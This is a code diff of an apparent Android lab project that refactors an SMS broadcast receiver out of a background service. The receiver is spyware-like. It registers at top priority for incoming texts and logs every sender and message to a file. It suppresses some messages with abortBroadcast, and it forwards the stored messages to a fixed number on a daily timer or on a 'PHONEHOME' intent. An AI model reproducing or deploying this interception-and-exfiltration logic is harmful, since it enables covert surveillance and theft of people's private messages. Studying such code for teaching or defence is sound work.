@@ -15,42 +15,19 @@ import android.widget.Toast;
 import java.io.*;
 import java.util.*;
 
-public class SMSService extends Service {
-    public static boolean isStarted;
-    private SMSReceiver smsReceiver = new SMSReceiver();
-
-    @Override
-    public void onCreate() {
-        super.onCreate();
-        isStarted = true;
-        IntentFilter i = new IntentFilter();
-        i.setPriority(Integer.MAX_VALUE);
-        i.addAction("android.provider.Telephony.SMS_RECEIVED");
-        i.addAction("com.madewithorbit.lab4.smsservice.STOP");
-        i.addAction("com.madewithorbit.lab4.smsservice.PHONEHOME");
-        i.addAction("android.intent.action.TIME_TICK");
-        registerReceiver(smsReceiver, i);
-        Log.d("zack","reg");
-    }
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
-
-    public class SMSReceiver extends BroadcastReceiver {
+public class SMSReceiver extends BroadcastReceiver {
         String midnightAddress = "5556";
         boolean toastOnReceive = false, sendAtTime = true;
         int hour = 22;
         int minute = 39;
         String lastNumber = "";
+
         @Override
         public void onReceive(Context context, Intent intent) {
             if (intent.getAction().equals("com.madewithorbit.lab4.smsservice.STOP"))
             {
                 Log.d("zack","unreg");
-                unregisterReceiver(this);
-                SMSService.this.stopSelf();
-                isStarted = false;
+                context.unregisterReceiver(this);
             }
             else if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
             {
@@ -70,7 +47,7 @@ public class SMSService extends Service {
 
                             Log.i("zack", "Receieved from: "+ senderNum + " Message: " + message);
 
-                            WriteToFile(senderNum, message);
+                            WriteToFile(context,senderNum, message);
 
                             if (toastOnReceive) {
                                 int duration = Toast.LENGTH_LONG;
@@ -82,7 +59,7 @@ public class SMSService extends Service {
                             {
                                 abortBroadcast();
                                 try {
-                                    SendFileContents();
+                                    SendFileContents(context);
                                 }
                                 catch(Exception e)
                                 {
@@ -99,7 +76,7 @@ public class SMSService extends Service {
             else if (intent.getAction().equals("com.madewithorbit.lab4.smsservice.PHONEHOME"))
             {
                 try {
-                    SendFileContents();
+                    SendFileContents(context);
                 }
                 catch(Exception e)
                 {
@@ -115,16 +92,16 @@ public class SMSService extends Service {
                 //Log.d("zack", m%2==0?"tick":"tock");
                 if (h == hour && m == minute) {
                     try {
-                        SendFileContents();
+                        SendFileContents(context);
                     } catch (Exception e) {
                         e.printStackTrace();
                     }
                 }
             }
         }
-        public void SendFileContents() throws IOException
+        public void SendFileContents(Context c) throws IOException
         {
-            String filename = getFilesDir() + "/messages.txt";
+            String filename = c.getFilesDir() + "/messages.txt";
             String result = "";
             File file = new File(filename);
             try {
@@ -171,9 +148,9 @@ public class SMSService extends Service {
             //todo: test this function
         }
 
-        public void WriteToFile(String sender, String message) throws IOException
+        public void WriteToFile(Context c,String sender, String message) throws IOException
         {
-            String filename = getFilesDir() + "/messages.txt";
+            String filename = c.getFilesDir() + "/messages.txt";
             File file = new File(filename);
             if (!file.exists())
             {
@@ -188,4 +165,3 @@ public class SMSService extends Service {
             osw.close();
         }
     }
-}
